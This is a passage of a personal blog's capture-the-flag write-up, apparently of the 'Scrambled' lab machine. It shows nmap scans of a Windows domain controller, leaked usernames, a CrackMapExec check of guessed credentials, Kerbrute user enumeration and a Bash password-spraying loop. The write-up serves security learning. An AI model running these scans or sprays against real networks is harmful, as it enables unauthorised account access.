<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Scrambled Write-up" /><meta property="og:locale" content="en" /><meta name="description" content="Enumeration" /><meta property="og:description" content="Enumeration" /><link rel="canonical" href="https://g2jz.github.io/posts/scrambled/" /><meta property="og:url" content="https://g2jz.github.io/posts/scrambled/" /><meta property="og:site_name" content="root@g2jz:~#" /><meta property="og:image" content="https://g2jz.github.io/cover.png" /><meta property="og:image:height" content="300" /><meta property="og:image:width" content="700" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-10-05T09:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://g2jz.github.io/cover.png" /><meta property="twitter:title" content="Scrambled Write-up" /><meta name="twitter:site" content="@g2jzz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-05T09:00:00+02:00","datePublished":"2022-10-05T09:00:00+02:00","description":"Enumeration","headline":"Scrambled Write-up","image":{"width":700,"height":300,"url":"https://g2jz.github.io/cover.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://g2jz.github.io/posts/scrambled/"},"url":"https://g2jz.github.io/posts/scrambled/"}</script><title>Scrambled Write-up | root@g2jz:~#</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="root@g2jz:~#"><meta name="application-name" content="root@g2jz:~#"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">root@g2jz:~#</a></div><div class="site-subtitle font-italic">g2jz's Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/g2jz" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/gaizka-martin/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://twitter.com/g2jzz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gmartinmendiola','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Scrambled Write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Scrambled Write-up</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1664953200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Oct 5, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 300'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/cover.png" class="preview-img bg" alt="Preview Image" width="700" height="300" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/g2jzz">Gaizka Mart√≠n Mendiola</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3814 words"> <em>21 min</em> read</span></div></div></div><div class="post-content"><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="os-detection"><span class="mr-2">OS Detection</span><a href="#os-detection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In order to identify the machine that we are dealing with, we will perform an OS detection. This can be done very simply, as the <code class="language-plaintext highlighter-rouge">TTL (Time To Live)</code> of a <code class="language-plaintext highlighter-rouge">ping</code> response can give us clues. <code class="language-plaintext highlighter-rouge">TTL</code> will be close to 64 on Unix machines, close to 128 on Windows machines, and close to 255 on Solaris machines.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/ping.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>ping target machine</em></p><p>We can see that the machine that we are targeting has a TTL of 127, so we guess that we are dealing with a Windows machine.</p><h3 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First, we will start enumerating the open ports on the victim machine. To do that, we will use <a href="https://github.com/nmap/nmap">nmap</a>. We will specify that we want to scan all the port range, that we only want to display the open ports and that we will use the TCP Syn Port Scan scanning method. Optionally, we will specify explicitly that we don‚Äôt want to perform host discovery and DNS resolution. This will speed up the process. Lastly, we will export all the evidence to a file called <code class="language-plaintext highlighter-rouge">allPorts.txt</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> allPorts.txt 10.10.11.168
</pre></table></code></div></div><div file="enum/access/allPorts" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/access/allPorts"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre># Nmap 7.92 scan initiated Thu Sep 22 13:56:32 2022 as: nmap -p- -sS --min-rate 5000 -n -Pn -oG allPorts.txt 10.10.11.168
Host: 10.10.11.168 ()	Status: Up
Host: 10.10.11.168 ()	Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 1433/open/tcp//ms-sql-s///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 4411/open/tcp//found///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49673/open/tcp/////, 49674/open/tcp/////, 49696/open/tcp/////, 49700/open/tcp/////, 58506/open/tcp/////	Ignored State: filtered (65513)
# Nmap done at Thu Sep 22 13:57:12 2022 -- 1 IP address (1 host up) scanned in 39.63 seconds
</pre></table></code></div></div><p>Once we know the open ports, we will scan them in a more exhaustive way to find the services and versions that are running. We will export evidence to the <code class="language-plaintext highlighter-rouge">targeted.txt</code> file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49696,49700,58506 <span class="nt">-sCV</span> <span class="nt">-oN</span> targeted.txt 10.10.11.168
</pre></table></code></div></div><div file="enum/access/targeted" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/access/targeted"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
</pre><td class="rouge-code"><pre># Nmap 7.92 scan initiated Thu Sep 22 13:58:00 2022 as: nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49696,49700,58506 -sCV -oN targeted.txt 10.10.11.168
Nmap scan report for 10.10.11.168
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-22 11:58:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-09-22T04:15:16
|_Not valid after:  2052-09-22T04:15:16
|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2022-06-09T15:30:57
|_Not valid after:  2023-06-09T15:30:57
|_ssl-date: 2022-09-22T12:01:12+00:00; -3s from scanner time.
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
58506/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.92%I=7%D=9/22%Time=632C4DCE%P=aarch64-unknown-linux-gn
SF:u%r(NULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V
SF:1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP
SF:_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1
SF:D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_O
SF:RDERS_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR
SF:_UNKNOWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")
SF:%r(TLSSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,
SF:"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDE
SF:RS_V1\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(FourOhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_C
SF:OMMAND;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UN
SF:KNOWN_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\
SF:r\n")%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOption
SF:s,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(L
SF:ANDesk-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0
SF:\.3;\r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI
SF:,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_
SF:ORDERS_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;
SF:\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 0s, median: -3s
| smb2-time: 
|   date: 2022-09-22T12:00:35
|_  start_date: N/A
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 22 14:01:17 2022 -- 1 IP address (1 host up) scanned in 197.29 seconds
</pre></table></code></div></div><p>This machine has plenty of open ports, but some of them attract our attention. We can see that ports 53 (DNS), 88 (Kerberos), 389 (LDAP) and 445 (SMB) are open. These ports are usually open in DCs (Domain Controllers), so we can take a guess. We can also see that port 4411 is not being identified correctly.</p><p>Additionally, we can see how the <code class="language-plaintext highlighter-rouge">LDAP</code> service leaks the <code class="language-plaintext highlighter-rouge">scrm.local</code> domain and the <code class="language-plaintext highlighter-rouge">dc1.scrm.local</code> <code class="language-plaintext highlighter-rouge">FQDN (Fully Qualified Domain Name)</code>, which identifies the <code class="language-plaintext highlighter-rouge">DC</code> in the domain. We will add the <code class="language-plaintext highlighter-rouge">DC's FQDN</code> to our <code class="language-plaintext filepath highlighter-rouge">/etc/hosts</code>, so it points to the target machine‚Äôs IP.</p><h3 id="web-server"><span class="mr-2">Web Server</span><a href="#web-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The first port that we will enumerate is the web <code class="language-plaintext highlighter-rouge">HTTP</code> server (80), as it usually reveals very useful information and there are plenty of web vulnerabilities.</p><p>On the root page of the web server, we will find a section called <code class="language-plaintext highlighter-rouge">IT Services</code> that contains different articles that describe procedures used in the company. This is very useful information, and sometimes things that seem the most harmless are the ones that provide the most information.</p><p>We will see the information that we can retrieve from the different articles:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/web3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>News Web Server</em></p><p>There is an alert on the web server that indicates that the company has been security breached and that the <code class="language-plaintext highlighter-rouge">NTLM</code> authentication has been disabled for the internal network. This seems harmless, but it is always a bad practice to reveal any information about how the internal network of a company is set up. In this case, we can take a guess that the authentication is done via <code class="language-plaintext highlighter-rouge">Kerberos</code> instead of <code class="language-plaintext highlighter-rouge">NTLM</code> in the internal network, so we will have it in mind.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/web2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>User leak</em></p><p>In the next article, we will see a tutorial on how to get network details in order to contact the technical team of the company. This also seems harmless, but if we take a look at the screenshot, we can see that the <code class="language-plaintext highlighter-rouge">ksimpson</code> user is being leaked.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/web1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>DC‚Äôs FQDN and service port leak</em></p><p>In the last article, we can see the <code class="language-plaintext highlighter-rouge">FQDN</code> of the <code class="language-plaintext highlighter-rouge">DC</code> and the port that an internal tool is using. If we remember the <code class="language-plaintext highlighter-rouge">nmap</code> enumeration, this was the port that was not being identified correctly. We can guess that this is a port used by a custom internal tool.</p><h3 id="1st-way-guessing-user-and-password"><span class="mr-2">1st Way: Guessing User and Password</span><a href="#1st-way-guessing-user-and-password" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>With all the information we have, we can guess that a potential user of the <code class="language-plaintext highlighter-rouge">AD</code> is <code class="language-plaintext highlighter-rouge">ksimpson</code>. We can also guess that this user is using a weak password, which is exactly his username.</p><p>We can validate these credentials with the <a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec</a> tool and using the following command (remember that the <code class="language-plaintext highlighter-rouge">SMB</code> port is open and that <code class="language-plaintext highlighter-rouge">NTLM</code> authentication has been disabled, so we have to use <code class="language-plaintext highlighter-rouge">Kerberos</code> authentication):</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cme smb 10.10.11.168 <span class="nt">-k</span> <span class="nt">-u</span> <span class="s1">'ksimpson'</span> <span class="nt">-p</span> <span class="s1">'ksimpson'</span>
</pre></table></code></div></div><p>So, just guessing, we will have the following correct credentials:</p><div file="enum/access/credentials.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/access/credentials.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>AD -&gt; ksimpson -&gt; ksimpson
</pre></table></code></div></div><h3 id="2nd-way-kerberos-brute-force"><span class="mr-2">2nd Way: Kerberos Brute-Force</span><a href="#2nd-way-kerberos-brute-force" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If you are not a guess person, you can always brute-force the <code class="language-plaintext highlighter-rouge">Kerberos</code> service in order to find users and passwords on the <code class="language-plaintext highlighter-rouge">AD</code>.</p><p>First, we will start enumerating users on the <code class="language-plaintext highlighter-rouge">AD</code>. In order to do that, we will use the <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> tool and the <code class="language-plaintext highlighter-rouge">xato-net-10-million-usernames.txt</code> wordlist from <a href="https://github.com/danielmiessler/SecLists">SecLists</a>:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/userSpray.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>User Enumeration</em></p><p>We will find the following usernames and we will save them in a file named <code class="language-plaintext highlighter-rouge">users.txt</code>:</p><div file="credentials/access/users.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="credentials/access/users.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>ksimpson
administrator
asmith
jhall
sjenkins
khicks
</pre></table></code></div></div><p>Now, we will try to do a password spraying. We will use the <code class="language-plaintext highlighter-rouge">users.txt</code> file for both users and passwords. As the <code class="language-plaintext highlighter-rouge">Kerbrute</code> tool only allows testing a single password for a username list, we will use the following <code class="language-plaintext highlighter-rouge">for</code> in <code class="language-plaintext highlighter-rouge">Bash</code> to fix this problem:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">for </span>pass <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>users.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>kerbrute bruteuser <span class="nt">-d</span> scrm.local <span class="nt">--dc</span> dc1.scrm.local users.txt <span class="nv">$pass</span><span class="p">;</span> <span class="k">done</span>
